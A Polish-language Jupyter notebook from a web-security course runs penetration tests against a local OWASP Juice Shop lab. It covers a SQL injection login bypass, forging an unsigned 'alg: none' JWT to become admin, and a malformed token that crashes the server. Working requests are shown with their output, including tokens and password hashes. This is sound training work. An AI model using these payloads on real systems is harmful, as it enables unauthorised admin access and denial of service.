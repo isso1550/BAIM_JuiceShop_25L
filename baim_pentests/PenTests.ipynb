{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Testy penetracyjne podstawowych podatności Juice Shop\n",
    "Tworzone na podstawie zajęć wchodzących w skład kursu Bezpieczeństwo Aplikacji Internetowych i Mobilnych"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Przygotowanie środowiska"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import json\n",
    "import base64\n",
    "\n",
    "url = 'http://localhost:3000'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 1. Podstawowy SQL Injection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "200\n",
      "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDMtMTIgMTA6NDQ6MjQuNTcyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDMtMTIgMTA6NDQ6MjQuNTcyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc0MTc3ODY1Mn0.zPXADRB4PBljyfItoObmu7mDHdYu2ZTJ1as4yZfcHzC6Kw7QfAfNdSNqVjccRd7rR-gS-nUUE_OVIVEZocmosglqZiAmcqmujFQUn0wFjK0tsl00NSBS_4H72kkyb7fOW3xfdy9lRIoo1t8r90NTbWsHl7Ee8rfGu2FOCgYYMgU\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}\n"
     ]
    }
   ],
   "source": [
    "data = {'email':\"' or 1=1;--\", 'password':'abc'}\n",
    "#data = {'email':\"xd\", 'password':'abc'}\n",
    "end = '/rest/user/login'\n",
    "response = requests.post(url+end, data)\n",
    "code = response.status_code\n",
    "print(code)\n",
    "if code == 200:\n",
    "    print(response.text)\n",
    "else:\n",
    "    print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 2. Manipulacje tokenami "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Sprawność endpointu"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "200\n"
     ]
    }
   ],
   "source": [
    "token = \"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJmaWxpcEBtYWlsLmNvbSIsInBhc3N3b3JkIjoiM2EzMGUwOGMxYThiODgzODZkOTg0ZTc3MDhmZWU3MWUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTAzLTEyIDExOjQ0OjUyLjc2NiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTAzLTEyIDExOjQ0OjUyLjc2NiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NDE3Nzk5MDV9.LFXHExQRmgANcXQEkf7Q8gNYlBCT5QBOizCPFZCSOGDo-WeGIS5v6beQ64u-dHtir1t1QnE6l9e5kZbu7d1iAHRGcWNB7YnFrr22agWTcwyBuVDk_bT5LAA7wEOgQ7b4sCyfkEaaV6LNxYtslrwg5fa3kwYfnRnnvOkprPpXa3Q\"\n",
    "data = {\"action\":\"setname\",\"query\":\"Carl\"}\n",
    "end = '/rest/chatbot/respond'\n",
    "headers = {\"Authentication\": \"Bearer \" + token}\n",
    "cookies = {'token':token}\n",
    "response = requests.post(url+end, data, headers=headers, cookies=cookies)\n",
    "code = response.status_code\n",
    "print(code)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Alg: none\n",
    "\n",
    "Token został tak zmodyfikowany, aby przekazywać fałszywe dane i nie posiadać podpisu"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending:  eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJub25lIn0.eyJzdGF0dXMiOiAic3VjY2VzcyIsICJkYXRhIjogeyJpZCI6IDEsICJ1c2VybmFtZSI6ICIiLCAiZW1haWwiOiAiZmlsaXBAbWFpbC5jb20iLCAicGFzc3dvcmQiOiAiM2EzMGUwOGMxYThiODgzODZkOTg0ZTc3MDhmZWU3MWUiLCAicm9sZSI6ICJjdXN0b21lciIsICJkZWx1eGVUb2tlbiI6ICIiLCAibGFzdExvZ2luSXAiOiAiMC4wLjAuMCIsICJwcm9maWxlSW1hZ2UiOiAiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCAidG90cFNlY3JldCI6ICIiLCAiaXNBY3RpdmUiOiB0cnVlLCAiY3JlYXRlZEF0IjogIjIwMjUtMDMtMTIgMTE6NDQ6NTIuNzY2ICswMDowMCIsICJ1cGRhdGVkQXQiOiAiMjAyNS0wMy0xMiAxMTo0NDo1Mi43NjYgKzAwOjAwIiwgImRlbGV0ZWRBdCI6IG51bGx9LCAiaWF0IjogMTc0MTc3OTkwNX0.\n",
      "200\n",
      "{\"action\":\"response\",\"body\":\"Nice to meet you Carl, I'm Juicy\",\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJDYXJsIiwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMDE5MjAyM2E3YmJkNzMyNTA1MTZmMDY5ZGYxOGI1MDAiLCJyb2xlIjoiYWRtaW4iLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTAzLTEyVDExOjU0OjQyLjg1OVoiLCJ1cGRhdGVkQXQiOiIyMDI1LTAzLTEyVDExOjU0OjQ5LjAyNVoiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NDE3ODA5NTR9.fE-TWN-SPcumqS51vZPU5Y2yg3ZeqOywE__q51ZaNnPmP0R0hZ3b_kFhY348bMSCjeH_ey99JaxUAlsd0pZpZimF3_ZeskeVGLE8EosjkejwAa-Y7_ifODrUQspPiPysQOutceLp_o9vYGkXoKZFRBZ9EkJozamp17pxEphbcek\"}\n",
      "{'status': 'success', 'data': {'id': 1, 'username': 'Carl', 'email': 'admin@juice-sh.op', 'password': '0192023a7bbd73250516f069df18b500', 'role': 'admin', 'deluxeToken': '', 'lastLoginIp': '', 'profileImage': 'assets/public/images/uploads/defaultAdmin.png', 'totpSecret': '', 'isActive': True, 'createdAt': '2025-03-12T11:54:42.859Z', 'updatedAt': '2025-03-12T11:54:49.025Z', 'deletedAt': None}, 'iat': 1741780954}\n",
      "PASSED\n"
     ]
    }
   ],
   "source": [
    "token_data = {\"status\":\"success\",\"data\":{\"id\":22,\"username\":\"\",\"email\":\"filip@mail.com\",\"password\":\"3a30e08c1a8b88386d984e7708fee71e\",\"role\":\"customer\",\"deluxeToken\":\"\",\"lastLoginIp\":\"0.0.0.0\",\"profileImage\":\"/assets/public/images/uploads/default.svg\",\"totpSecret\":\"\",\"isActive\":True,\"createdAt\":\"2025-03-12 11:44:52.766 +00:00\",\"updatedAt\":\"2025-03-12 11:44:52.766 +00:00\",\"deletedAt\":None},\"iat\":1741779905}\n",
    "token_header = {\"typ\":\"JWT\",\"alg\":\"none\"}\n",
    "\n",
    "#Dowolna modyfikacja - dla admin = 1\n",
    "token_data['data']['id'] = 1\n",
    "\n",
    "header_encoded = base64.b64encode(json.dumps(token_header).encode()).decode().strip('=')\n",
    "data_encoded = base64.b64encode(json.dumps(token_data).encode()).decode().strip('=')\n",
    "\n",
    "token = header_encoded + '.' + data_encoded + '.'\n",
    "\n",
    "print(\"Sending: \", token)\n",
    "\n",
    "data = {\"action\":\"setname\",\"query\":\"Carl\"}\n",
    "end = '/rest/chatbot/respond'\n",
    "headers = {\"Authentication\": \"Bearer \" + token}\n",
    "cookies = {'token':token}\n",
    "response = requests.post(url+end, data, headers=headers, cookies=cookies)\n",
    "code = response.status_code\n",
    "print(code)\n",
    "print(response.text)\n",
    "\n",
    "\n",
    "#Dodany nadmiarowy padding na wszelki wypadek \n",
    "#https://stackoverflow.com/questions/2941995/python-ignore-incorrect-padding-error-when-base64-decoding\n",
    "received_token_data = json.loads(base64.b64decode(response.json()['token'].split('.')[1] + '==========').decode())\n",
    "\n",
    "print(received_token_data)\n",
    "\n",
    "if received_token_data['data']['email'] == 'admin@juice-sh.op':\n",
    "    print(\"PASSED\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Zamiana alg. na HS\n",
    "TODO"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Wywołanie błędu cannor read properties of null w jws.decode\n",
    "\n",
    "UWAGA! Odcina serwer!\n",
    "\n",
    "B:\\prg\\L25\\baim\\BAIM_JuiceShop_25L\\node_modules\\jsonwebtoken\\index.js:4\n",
    "  return jws.decode(jwt).payload;\n",
    "                        ^\n",
    "\n",
    "TypeError: Cannot read properties of null (reading 'payload')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "RUN = False\n",
    "if (RUN):\n",
    "    token_header = {\"typ\":\"JWT\",\"alg\":\"none\"}\n",
    "    token_data['data']['id'] = 1\n",
    "    header_encoded = base64.b64encode(json.dumps(token_header).encode()).decode().strip('=')\n",
    "    \n",
    "    #Token bez danych\n",
    "    token = header_encoded + '.'  + '.'\n",
    "    \n",
    "    data = {\"action\":\"setname\",\"query\":\"Carl\"}\n",
    "    end = '/rest/chatbot/respond'\n",
    "    headers = {\"Authentication\": \"Bearer \" + token}\n",
    "    cookies = {'token':token}\n",
    "    response = requests.post(url+end, data, headers=headers, cookies=cookies)\n",
    "    code = response.status_code\n",
    "    print(code)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
